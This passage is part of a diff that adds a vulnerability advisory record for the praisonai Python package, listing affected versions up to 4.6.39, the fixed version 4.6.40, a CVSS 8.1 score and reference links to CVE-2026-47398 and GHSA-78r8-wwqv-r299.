+      - pkg:pypi/praisonai@2.0.69
+      - pkg:pypi/praisonai@2.0.70
+      - pkg:pypi/praisonai@2.0.71
+      - pkg:pypi/praisonai@2.0.72
+      - pkg:pypi/praisonai@2.0.73
+      - pkg:pypi/praisonai@2.0.74
+      - pkg:pypi/praisonai@2.0.75
+      - pkg:pypi/praisonai@2.0.76
+      - pkg:pypi/praisonai@2.0.77
+      - pkg:pypi/praisonai@2.0.78
+      - pkg:pypi/praisonai@2.0.79
+      - pkg:pypi/praisonai@2.0.80
+      - pkg:pypi/praisonai@2.0.81
+      - pkg:pypi/praisonai@2.1.0
+      - pkg:pypi/praisonai@2.1.1
+      - pkg:pypi/praisonai@2.1.4
+      - pkg:pypi/praisonai@2.1.5
+      - pkg:pypi/praisonai@2.1.6
+      - pkg:pypi/praisonai@2.2.1
+      - pkg:pypi/praisonai@2.2.2
+      - pkg:pypi/praisonai@2.2.3
+      - pkg:pypi/praisonai@2.2.4
+      - pkg:pypi/praisonai@2.2.5
+      - pkg:pypi/praisonai@2.2.6
+      - pkg:pypi/praisonai@2.2.7
+      - pkg:pypi/praisonai@2.2.8
+      - pkg:pypi/praisonai@2.2.9
+      - pkg:pypi/praisonai@2.2.10
+      - pkg:pypi/praisonai@2.2.11
+      - pkg:pypi/praisonai@2.2.12
+      - pkg:pypi/praisonai@2.2.13
+      - pkg:pypi/praisonai@2.2.14
+      - pkg:pypi/praisonai@2.2.15
+      - pkg:pypi/praisonai@2.2.16
+      - pkg:pypi/praisonai@2.2.17
+      - pkg:pypi/praisonai@2.2.18
+      - pkg:pypi/praisonai@2.2.19
+      - pkg:pypi/praisonai@2.2.20
+      - pkg:pypi/praisonai@2.2.21
+      - pkg:pypi/praisonai@2.2.22
+      - pkg:pypi/praisonai@2.2.24
+      - pkg:pypi/praisonai@2.2.25
+      - pkg:pypi/praisonai@2.2.26
+      - pkg:pypi/praisonai@2.2.27
+      - pkg:pypi/praisonai@2.2.28
+      - pkg:pypi/praisonai@2.2.29
+      - pkg:pypi/praisonai@2.2.30
+      - pkg:pypi/praisonai@2.2.31
+      - pkg:pypi/praisonai@2.2.32
+      - pkg:pypi/praisonai@2.2.33
+      - pkg:pypi/praisonai@2.2.34
+      - pkg:pypi/praisonai@2.2.35
+      - pkg:pypi/praisonai@2.2.36
+      - pkg:pypi/praisonai@2.2.37
+      - pkg:pypi/praisonai@2.2.38
+      - pkg:pypi/praisonai@2.2.39
+      - pkg:pypi/praisonai@2.2.40
+      - pkg:pypi/praisonai@2.2.41
+      - pkg:pypi/praisonai@2.2.42
+      - pkg:pypi/praisonai@2.2.43
+      - pkg:pypi/praisonai@2.2.44
+      - pkg:pypi/praisonai@2.2.45
+      - pkg:pypi/praisonai@2.2.46
+      - pkg:pypi/praisonai@2.2.47
+      - pkg:pypi/praisonai@2.2.48
+      - pkg:pypi/praisonai@2.2.49
+      - pkg:pypi/praisonai@2.2.50
+      - pkg:pypi/praisonai@2.2.51
+      - pkg:pypi/praisonai@2.2.52
+      - pkg:pypi/praisonai@2.2.53
+      - pkg:pypi/praisonai@2.2.54
+      - pkg:pypi/praisonai@2.2.55
+      - pkg:pypi/praisonai@2.2.56
+      - pkg:pypi/praisonai@2.2.57
+      - pkg:pypi/praisonai@2.2.58
+      - pkg:pypi/praisonai@2.2.59
+      - pkg:pypi/praisonai@2.2.60
+      - pkg:pypi/praisonai@2.2.61
+      - pkg:pypi/praisonai@2.2.62
+      - pkg:pypi/praisonai@2.2.63
+      - pkg:pypi/praisonai@2.2.64
+      - pkg:pypi/praisonai@2.2.65
+      - pkg:pypi/praisonai@2.2.66
+      - pkg:pypi/praisonai@2.2.67
+      - pkg:pypi/praisonai@2.2.68
+      - pkg:pypi/praisonai@2.2.69
+      - pkg:pypi/praisonai@2.2.70
+      - pkg:pypi/praisonai@2.2.71
+      - pkg:pypi/praisonai@2.2.72
+      - pkg:pypi/praisonai@2.2.73
+      - pkg:pypi/praisonai@2.2.74
+      - pkg:pypi/praisonai@2.2.75
+      - pkg:pypi/praisonai@2.2.76
+      - pkg:pypi/praisonai@2.2.77
+      - pkg:pypi/praisonai@2.2.78
+      - pkg:pypi/praisonai@2.2.79
+      - pkg:pypi/praisonai@2.2.80
+      - pkg:pypi/praisonai@2.2.81
+      - pkg:pypi/praisonai@2.2.82
+      - pkg:pypi/praisonai@2.2.83
+      - pkg:pypi/praisonai@2.2.84
+      - pkg:pypi/praisonai@2.2.86
+      - pkg:pypi/praisonai@2.2.87
+      - pkg:pypi/praisonai@2.2.88
+      - pkg:pypi/praisonai@2.2.89
+      - pkg:pypi/praisonai@2.2.90
+      - pkg:pypi/praisonai@2.2.91
+      - pkg:pypi/praisonai@2.2.93
+      - pkg:pypi/praisonai@2.2.95
+      - pkg:pypi/praisonai@2.2.96
+      - pkg:pypi/praisonai@2.2.97
+      - pkg:pypi/praisonai@2.2.98
+      - pkg:pypi/praisonai@2.2.99
+      - pkg:pypi/praisonai@2.3.0
+      - pkg:pypi/praisonai@2.3.1
+      - pkg:pypi/praisonai@2.3.2
+      - pkg:pypi/praisonai@2.3.3
+      - pkg:pypi/praisonai@2.3.4
+      - pkg:pypi/praisonai@2.3.5
+      - pkg:pypi/praisonai@2.3.6
+      - pkg:pypi/praisonai@2.3.7
+      - pkg:pypi/praisonai@2.3.8
+      - pkg:pypi/praisonai@2.3.9
+      - pkg:pypi/praisonai@2.3.10
+      - pkg:pypi/praisonai@2.3.11
+      - pkg:pypi/praisonai@2.3.12
+      - pkg:pypi/praisonai@2.3.13
+      - pkg:pypi/praisonai@2.3.14
+      - pkg:pypi/praisonai@2.3.15
+      - pkg:pypi/praisonai@2.3.16
+      - pkg:pypi/praisonai@2.3.18
+      - pkg:pypi/praisonai@2.3.19
+      - pkg:pypi/praisonai@2.3.20
+      - pkg:pypi/praisonai@2.3.21
+      - pkg:pypi/praisonai@2.3.22
+      - pkg:pypi/praisonai@2.3.23
+      - pkg:pypi/praisonai@2.3.24
+      - pkg:pypi/praisonai@2.3.25
+      - pkg:pypi/praisonai@2.3.26
+      - pkg:pypi/praisonai@2.3.27
+      - pkg:pypi/praisonai@2.3.28
+      - pkg:pypi/praisonai@2.3.29
+      - pkg:pypi/praisonai@2.3.30
+      - pkg:pypi/praisonai@2.3.31
+      - pkg:pypi/praisonai@2.3.32
+      - pkg:pypi/praisonai@2.3.33
+      - pkg:pypi/praisonai@2.3.34
+      - pkg:pypi/praisonai@2.3.35
+      - pkg:pypi/praisonai@2.3.36
+      - pkg:pypi/praisonai@2.3.37
+      - pkg:pypi/praisonai@2.3.38
+      - pkg:pypi/praisonai@2.3.39
+      - pkg:pypi/praisonai@2.3.40
+      - pkg:pypi/praisonai@2.3.41
+      - pkg:pypi/praisonai@2.3.42
+      - pkg:pypi/praisonai@2.3.43
+      - pkg:pypi/praisonai@2.3.44
+      - pkg:pypi/praisonai@2.3.45
+      - pkg:pypi/praisonai@2.3.46
+      - pkg:pypi/praisonai@2.3.47
+      - pkg:pypi/praisonai@2.3.48
+      - pkg:pypi/praisonai@2.3.49
+      - pkg:pypi/praisonai@2.3.50
+      - pkg:pypi/praisonai@2.3.51
+      - pkg:pypi/praisonai@2.3.52
+      - pkg:pypi/praisonai@2.3.53
+      - pkg:pypi/praisonai@2.3.54
+      - pkg:pypi/praisonai@2.3.55
+      - pkg:pypi/praisonai@2.3.56
+      - pkg:pypi/praisonai@2.3.57
+      - pkg:pypi/praisonai@2.3.58
+      - pkg:pypi/praisonai@2.3.59
+      - pkg:pypi/praisonai@2.3.60
+      - pkg:pypi/praisonai@2.3.61
+      - pkg:pypi/praisonai@2.3.62
+      - pkg:pypi/praisonai@2.3.63
+      - pkg:pypi/praisonai@2.3.64
+      - pkg:pypi/praisonai@2.3.65
+      - pkg:pypi/praisonai@2.3.66
+      - pkg:pypi/praisonai@2.3.67
+      - pkg:pypi/praisonai@2.3.68
+      - pkg:pypi/praisonai@2.3.69
+      - pkg:pypi/praisonai@2.3.70
+      - pkg:pypi/praisonai@2.3.71
+      - pkg:pypi/praisonai@2.3.72
+      - pkg:pypi/praisonai@2.3.73
+      - pkg:pypi/praisonai@2.3.74
+      - pkg:pypi/praisonai@2.3.75
+      - pkg:pypi/praisonai@2.3.76
+      - pkg:pypi/praisonai@2.3.77
+      - pkg:pypi/praisonai@2.3.78
+      - pkg:pypi/praisonai@2.3.79
+      - pkg:pypi/praisonai@2.3.80
+      - pkg:pypi/praisonai@2.3.81
+      - pkg:pypi/praisonai@2.3.82
+      - pkg:pypi/praisonai@2.3.83
+      - pkg:pypi/praisonai@2.3.84
+      - pkg:pypi/praisonai@2.3.85
+      - pkg:pypi/praisonai@2.3.86
+      - pkg:pypi/praisonai@2.3.87
+      - pkg:pypi/praisonai@2.4.0
+      - pkg:pypi/praisonai@2.4.1
+      - pkg:pypi/praisonai@2.4.2
+      - pkg:pypi/praisonai@2.4.3
+      - pkg:pypi/praisonai@2.4.4
+      - pkg:pypi/praisonai@2.5.0
+      - pkg:pypi/praisonai@2.5.1
+      - pkg:pypi/praisonai@2.5.2
+      - pkg:pypi/praisonai@2.5.3
+      - pkg:pypi/praisonai@2.5.4
+      - pkg:pypi/praisonai@2.5.5
+      - pkg:pypi/praisonai@2.5.6
+      - pkg:pypi/praisonai@2.5.7
+      - pkg:pypi/praisonai@2.6.0
+      - pkg:pypi/praisonai@2.6.1
+      - pkg:pypi/praisonai@2.6.2
+      - pkg:pypi/praisonai@2.6.3
+      - pkg:pypi/praisonai@2.6.4
+      - pkg:pypi/praisonai@2.6.5
+      - pkg:pypi/praisonai@2.6.6
+      - pkg:pypi/praisonai@2.6.7
+      - pkg:pypi/praisonai@2.6.8
+      - pkg:pypi/praisonai@2.7.0
+      - pkg:pypi/praisonai@2.8.3
+      - pkg:pypi/praisonai@2.8.4
+      - pkg:pypi/praisonai@2.8.5
+      - pkg:pypi/praisonai@2.8.6
+      - pkg:pypi/praisonai@2.8.7
+      - pkg:pypi/praisonai@2.8.8
+      - pkg:pypi/praisonai@2.8.9
+      - pkg:pypi/praisonai@2.9.0
+      - pkg:pypi/praisonai@2.9.1
+      - pkg:pypi/praisonai@2.9.2
+      - pkg:pypi/praisonai@3.0.0
+      - pkg:pypi/praisonai@3.0.1
+      - pkg:pypi/praisonai@3.0.2
+      - pkg:pypi/praisonai@3.0.3
+      - pkg:pypi/praisonai@3.0.4
+      - pkg:pypi/praisonai@3.0.5
+      - pkg:pypi/praisonai@3.0.6
+      - pkg:pypi/praisonai@3.0.7
+      - pkg:pypi/praisonai@3.0.8
+      - pkg:pypi/praisonai@3.0.9
+      - pkg:pypi/praisonai@3.1.0
+      - pkg:pypi/praisonai@3.1.1
+      - pkg:pypi/praisonai@3.1.2
+      - pkg:pypi/praisonai@3.1.3
+      - pkg:pypi/praisonai@3.1.4
+      - pkg:pypi/praisonai@3.1.5
+      - pkg:pypi/praisonai@3.1.6
+      - pkg:pypi/praisonai@3.1.7
+      - pkg:pypi/praisonai@3.1.8
+      - pkg:pypi/praisonai@3.1.9
+      - pkg:pypi/praisonai@3.2.0
+      - pkg:pypi/praisonai@3.2.1
+      - pkg:pypi/praisonai@3.3.0
+      - pkg:pypi/praisonai@3.3.1
+      - pkg:pypi/praisonai@3.4.0
+      - pkg:pypi/praisonai@3.4.1
+      - pkg:pypi/praisonai@3.5.0
+      - pkg:pypi/praisonai@3.5.1
+      - pkg:pypi/praisonai@3.5.2
+      - pkg:pypi/praisonai@3.5.3
+      - pkg:pypi/praisonai@3.5.4
+      - pkg:pypi/praisonai@3.5.5
+      - pkg:pypi/praisonai@3.5.6
+      - pkg:pypi/praisonai@3.5.7
+      - pkg:pypi/praisonai@3.5.8
+      - pkg:pypi/praisonai@3.5.9
+      - pkg:pypi/praisonai@3.6.0
+      - pkg:pypi/praisonai@3.6.1
+      - pkg:pypi/praisonai@3.6.2
+      - pkg:pypi/praisonai@3.7.0
+      - pkg:pypi/praisonai@3.7.1
+      - pkg:pypi/praisonai@3.7.2
+      - pkg:pypi/praisonai@3.7.3
+      - pkg:pypi/praisonai@3.7.4
+      - pkg:pypi/praisonai@3.7.5
+      - pkg:pypi/praisonai@3.7.6
+      - pkg:pypi/praisonai@3.7.7
+      - pkg:pypi/praisonai@3.7.8
+      - pkg:pypi/praisonai@3.7.9
+      - pkg:pypi/praisonai@3.8.0
+      - pkg:pypi/praisonai@3.8.1
+      - pkg:pypi/praisonai@3.8.2
+      - pkg:pypi/praisonai@3.8.3
+      - pkg:pypi/praisonai@3.8.4
+      - pkg:pypi/praisonai@3.8.5
+      - pkg:pypi/praisonai@3.8.6
+      - pkg:pypi/praisonai@3.8.7
+      - pkg:pypi/praisonai@3.8.8
+      - pkg:pypi/praisonai@3.8.9
+      - pkg:pypi/praisonai@3.8.10
+      - pkg:pypi/praisonai@3.8.11
+      - pkg:pypi/praisonai@3.8.12
+      - pkg:pypi/praisonai@3.8.13
+      - pkg:pypi/praisonai@3.8.14
+      - pkg:pypi/praisonai@3.8.16
+      - pkg:pypi/praisonai@3.8.17
+      - pkg:pypi/praisonai@3.8.18
+      - pkg:pypi/praisonai@3.8.19
+      - pkg:pypi/praisonai@3.8.20
+      - pkg:pypi/praisonai@3.8.21
+      - pkg:pypi/praisonai@3.8.22
+      - pkg:pypi/praisonai@3.9.0
+      - pkg:pypi/praisonai@3.9.1
+      - pkg:pypi/praisonai@3.9.2
+      - pkg:pypi/praisonai@3.9.3
+      - pkg:pypi/praisonai@3.9.4
+      - pkg:pypi/praisonai@3.9.5
+      - pkg:pypi/praisonai@3.9.6
+      - pkg:pypi/praisonai@3.9.7
+      - pkg:pypi/praisonai@3.9.8
+      - pkg:pypi/praisonai@3.9.9
+      - pkg:pypi/praisonai@3.9.10
+      - pkg:pypi/praisonai@3.9.11
+      - pkg:pypi/praisonai@3.9.12
+      - pkg:pypi/praisonai@3.9.13
+      - pkg:pypi/praisonai@3.9.14
+      - pkg:pypi/praisonai@3.9.15
+      - pkg:pypi/praisonai@3.9.16
+      - pkg:pypi/praisonai@3.9.17
+      - pkg:pypi/praisonai@3.9.18
+      - pkg:pypi/praisonai@3.9.19
+      - pkg:pypi/praisonai@3.9.20
+      - pkg:pypi/praisonai@3.9.21
+      - pkg:pypi/praisonai@3.9.22
+      - pkg:pypi/praisonai@3.9.23
+      - pkg:pypi/praisonai@3.9.24
+      - pkg:pypi/praisonai@3.9.25
+      - pkg:pypi/praisonai@3.9.26
+      - pkg:pypi/praisonai@3.9.27
+      - pkg:pypi/praisonai@3.9.28
+      - pkg:pypi/praisonai@3.9.29
+      - pkg:pypi/praisonai@3.9.30
+      - pkg:pypi/praisonai@3.9.31
+      - pkg:pypi/praisonai@3.9.32
+      - pkg:pypi/praisonai@3.9.33
+      - pkg:pypi/praisonai@3.9.34
+      - pkg:pypi/praisonai@3.9.35
+      - pkg:pypi/praisonai@3.10.0
+      - pkg:pypi/praisonai@3.10.1
+      - pkg:pypi/praisonai@3.10.2
+      - pkg:pypi/praisonai@3.10.3
+      - pkg:pypi/praisonai@3.10.4
+      - pkg:pypi/praisonai@3.10.5
+      - pkg:pypi/praisonai@3.10.6
+      - pkg:pypi/praisonai@3.10.7
+      - pkg:pypi/praisonai@3.10.8
+      - pkg:pypi/praisonai@3.10.9
+      - pkg:pypi/praisonai@3.10.10
+      - pkg:pypi/praisonai@3.10.11
+      - pkg:pypi/praisonai@3.10.12
+      - pkg:pypi/praisonai@3.10.13
+      - pkg:pypi/praisonai@3.10.14
+      - pkg:pypi/praisonai@3.10.15
+      - pkg:pypi/praisonai@3.10.16
+      - pkg:pypi/praisonai@3.10.17
+      - pkg:pypi/praisonai@3.10.18
+      - pkg:pypi/praisonai@3.10.19
+      - pkg:pypi/praisonai@3.10.20
+      - pkg:pypi/praisonai@3.10.21
+      - pkg:pypi/praisonai@3.10.22
+      - pkg:pypi/praisonai@3.10.23
+      - pkg:pypi/praisonai@3.10.24
+      - pkg:pypi/praisonai@3.10.25
+      - pkg:pypi/praisonai@3.10.26
+      - pkg:pypi/praisonai@3.10.27
+      - pkg:pypi/praisonai@3.11.0
+      - pkg:pypi/praisonai@3.11.1
+      - pkg:pypi/praisonai@3.11.2
+      - pkg:pypi/praisonai@3.11.3
+      - pkg:pypi/praisonai@3.11.4
+      - pkg:pypi/praisonai@3.11.8
+      - pkg:pypi/praisonai@3.11.9
+      - pkg:pypi/praisonai@3.11.10
+      - pkg:pypi/praisonai@3.11.11
+      - pkg:pypi/praisonai@3.11.12
+      - pkg:pypi/praisonai@3.11.13
+      - pkg:pypi/praisonai@3.11.14
+      - pkg:pypi/praisonai@3.12.0
+      - pkg:pypi/praisonai@3.12.1
+      - pkg:pypi/praisonai@3.12.2
+      - pkg:pypi/praisonai@3.12.3
+      - pkg:pypi/praisonai@4.0.0
+      - pkg:pypi/praisonai@4.1.0
+      - pkg:pypi/praisonai@4.2.0
+      - pkg:pypi/praisonai@4.2.1
+      - pkg:pypi/praisonai@4.2.2
+      - pkg:pypi/praisonai@4.2.3
+      - pkg:pypi/praisonai@4.2.4
+      - pkg:pypi/praisonai@4.3.0
+      - pkg:pypi/praisonai@4.3.1
+      - pkg:pypi/praisonai@4.4.0
+      - pkg:pypi/praisonai@4.4.2
+      - pkg:pypi/praisonai@4.4.3
+      - pkg:pypi/praisonai@4.4.4
+      - pkg:pypi/praisonai@4.4.5
+      - pkg:pypi/praisonai@4.4.6
+      - pkg:pypi/praisonai@4.4.7
+      - pkg:pypi/praisonai@4.4.8
+      - pkg:pypi/praisonai@4.4.9
+      - pkg:pypi/praisonai@4.4.10
+      - pkg:pypi/praisonai@4.4.11
+      - pkg:pypi/praisonai@4.4.12
+      - pkg:pypi/praisonai@4.5.0
+      - pkg:pypi/praisonai@4.5.1
+      - pkg:pypi/praisonai@4.5.2
+      - pkg:pypi/praisonai@4.5.3
+      - pkg:pypi/praisonai@4.5.5
+      - pkg:pypi/praisonai@4.5.6
+      - pkg:pypi/praisonai@4.5.7
+      - pkg:pypi/praisonai@4.5.8
+      - pkg:pypi/praisonai@4.5.9
+      - pkg:pypi/praisonai@4.5.10
+      - pkg:pypi/praisonai@4.5.11
+      - pkg:pypi/praisonai@4.5.12
+      - pkg:pypi/praisonai@4.5.13
+      - pkg:pypi/praisonai@4.5.14
+      - pkg:pypi/praisonai@4.5.15
+      - pkg:pypi/praisonai@4.5.16
+      - pkg:pypi/praisonai@4.5.18
+      - pkg:pypi/praisonai@4.5.19
+      - pkg:pypi/praisonai@4.5.20
+      - pkg:pypi/praisonai@4.5.21
+      - pkg:pypi/praisonai@4.5.22
+      - pkg:pypi/praisonai@4.5.23
+      - pkg:pypi/praisonai@4.5.24
+      - pkg:pypi/praisonai@4.5.25
+      - pkg:pypi/praisonai@4.5.26
+      - pkg:pypi/praisonai@4.5.27
+      - pkg:pypi/praisonai@4.5.28
+      - pkg:pypi/praisonai@4.5.29
+      - pkg:pypi/praisonai@4.5.30
+      - pkg:pypi/praisonai@4.5.31
+      - pkg:pypi/praisonai@4.5.32
+      - pkg:pypi/praisonai@4.5.33
+      - pkg:pypi/praisonai@4.5.34
+      - pkg:pypi/praisonai@4.5.35
+      - pkg:pypi/praisonai@4.5.36
+      - pkg:pypi/praisonai@4.5.37
+      - pkg:pypi/praisonai@4.5.38
+      - pkg:pypi/praisonai@4.5.39
+      - pkg:pypi/praisonai@4.5.40
+      - pkg:pypi/praisonai@4.5.41
+      - pkg:pypi/praisonai@4.5.42
+      - pkg:pypi/praisonai@4.5.43
+      - pkg:pypi/praisonai@4.5.44
+      - pkg:pypi/praisonai@4.5.45
+      - pkg:pypi/praisonai@4.5.46
+      - pkg:pypi/praisonai@4.5.48
+      - pkg:pypi/praisonai@4.5.49
+      - pkg:pypi/praisonai@4.5.51
+      - pkg:pypi/praisonai@4.5.52
+      - pkg:pypi/praisonai@4.5.54
+      - pkg:pypi/praisonai@4.5.55
+      - pkg:pypi/praisonai@4.5.56
+      - pkg:pypi/praisonai@4.5.57
+      - pkg:pypi/praisonai@4.5.58
+      - pkg:pypi/praisonai@4.5.59
+      - pkg:pypi/praisonai@4.5.60
+      - pkg:pypi/praisonai@4.5.62
+      - pkg:pypi/praisonai@4.5.63
+      - pkg:pypi/praisonai@4.5.64
+      - pkg:pypi/praisonai@4.5.65
+      - pkg:pypi/praisonai@4.5.67
+      - pkg:pypi/praisonai@4.5.68
+      - pkg:pypi/praisonai@4.5.69
+      - pkg:pypi/praisonai@4.5.70
+      - pkg:pypi/praisonai@4.5.71
+      - pkg:pypi/praisonai@4.5.72
+      - pkg:pypi/praisonai@4.5.73
+      - pkg:pypi/praisonai@4.5.74
+      - pkg:pypi/praisonai@4.5.76
+      - pkg:pypi/praisonai@4.5.77
+      - pkg:pypi/praisonai@4.5.78
+      - pkg:pypi/praisonai@4.5.79
+      - pkg:pypi/praisonai@4.5.80
+      - pkg:pypi/praisonai@4.5.81
+      - pkg:pypi/praisonai@4.5.82
+      - pkg:pypi/praisonai@4.5.83
+      - pkg:pypi/praisonai@4.5.85
+      - pkg:pypi/praisonai@4.5.87
+      - pkg:pypi/praisonai@4.5.88
+      - pkg:pypi/praisonai@4.5.89
+      - pkg:pypi/praisonai@4.5.90
+      - pkg:pypi/praisonai@4.5.93
+      - pkg:pypi/praisonai@4.5.94
+      - pkg:pypi/praisonai@4.5.95
+      - pkg:pypi/praisonai@4.5.96
+      - pkg:pypi/praisonai@4.5.97
+      - pkg:pypi/praisonai@4.5.98
+      - pkg:pypi/praisonai@4.5.100
+      - pkg:pypi/praisonai@4.5.101
+      - pkg:pypi/praisonai@4.5.102
+      - pkg:pypi/praisonai@4.5.103
+      - pkg:pypi/praisonai@4.5.104
+      - pkg:pypi/praisonai@4.5.105
+      - pkg:pypi/praisonai@4.5.106
+      - pkg:pypi/praisonai@4.5.107
+      - pkg:pypi/praisonai@4.5.108
+      - pkg:pypi/praisonai@4.5.109
+      - pkg:pypi/praisonai@4.5.110
+      - pkg:pypi/praisonai@4.5.111
+      - pkg:pypi/praisonai@4.5.112
+      - pkg:pypi/praisonai@4.5.113
+      - pkg:pypi/praisonai@4.5.114
+      - pkg:pypi/praisonai@4.5.115
+      - pkg:pypi/praisonai@4.5.117
+      - pkg:pypi/praisonai@4.5.118
+      - pkg:pypi/praisonai@4.5.119
+      - pkg:pypi/praisonai@4.5.120
+      - pkg:pypi/praisonai@4.5.121
+      - pkg:pypi/praisonai@4.5.122
+      - pkg:pypi/praisonai@4.5.123
+      - pkg:pypi/praisonai@4.5.124
+      - pkg:pypi/praisonai@4.5.125
+      - pkg:pypi/praisonai@4.5.126
+      - pkg:pypi/praisonai@4.5.127
+      - pkg:pypi/praisonai@4.5.128
+      - pkg:pypi/praisonai@4.5.129
+      - pkg:pypi/praisonai@4.5.130
+      - pkg:pypi/praisonai@4.5.131
+      - pkg:pypi/praisonai@4.5.132
+      - pkg:pypi/praisonai@4.5.133
+      - pkg:pypi/praisonai@4.5.134
+      - pkg:pypi/praisonai@4.5.135
+      - pkg:pypi/praisonai@4.5.136
+      - pkg:pypi/praisonai@4.5.137
+      - pkg:pypi/praisonai@4.5.139
+      - pkg:pypi/praisonai@4.5.140
+      - pkg:pypi/praisonai@4.5.143
+      - pkg:pypi/praisonai@4.5.144
+      - pkg:pypi/praisonai@4.5.145
+      - pkg:pypi/praisonai@4.5.149
+      - pkg:pypi/praisonai@4.6.9
+      - pkg:pypi/praisonai@4.6.10
+      - pkg:pypi/praisonai@4.6.11
+      - pkg:pypi/praisonai@4.6.12
+      - pkg:pypi/praisonai@4.6.13
+      - pkg:pypi/praisonai@4.6.14
+      - pkg:pypi/praisonai@4.6.15
+      - pkg:pypi/praisonai@4.6.16
+      - pkg:pypi/praisonai@4.6.18
+      - pkg:pypi/praisonai@4.6.19
+      - pkg:pypi/praisonai@4.6.20
+      - pkg:pypi/praisonai@4.6.21
+      - pkg:pypi/praisonai@4.6.22
+      - pkg:pypi/praisonai@4.6.23
+      - pkg:pypi/praisonai@4.6.24
+      - pkg:pypi/praisonai@4.6.25
+      - pkg:pypi/praisonai@4.6.26
+      - pkg:pypi/praisonai@4.6.27
+      - pkg:pypi/praisonai@4.6.28
+      - pkg:pypi/praisonai@4.6.29
+      - pkg:pypi/praisonai@4.6.30
+      - pkg:pypi/praisonai@4.6.31
+      - pkg:pypi/praisonai@4.6.32
+      - pkg:pypi/praisonai@4.6.33
+      - pkg:pypi/praisonai@4.6.34
+      - pkg:pypi/praisonai@4.6.35
+      - pkg:pypi/praisonai@4.6.36
+      - pkg:pypi/praisonai@4.6.37
+      - pkg:pypi/praisonai@4.6.38
+      - pkg:pypi/praisonai@4.6.39
+    fixed_packages:
+      - pkg:pypi/praisonai@4.6.40
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/pypa/advisory-database/blob/main/vulns/praisonai/PYSEC-2026-2905.yaml
+weaknesses: []
+references:
+  - url: https://github.com/MervinPraison/PraisonAI
+    reference_type:
+    reference_id:
+  - url: https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-78r8-wwqv-r299
+    reference_type:
+    reference_id:
+  - url: https://pypi.org/project/praisonai
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-47398
+    reference_type:
+    reference_id: CVE-2026-47398
+  - url: https://github.com/advisories/GHSA-78r8-wwqv-r299
+    reference_type:
+    reference_id: GHSA-78r8-wwqv-r299
+exploits: []
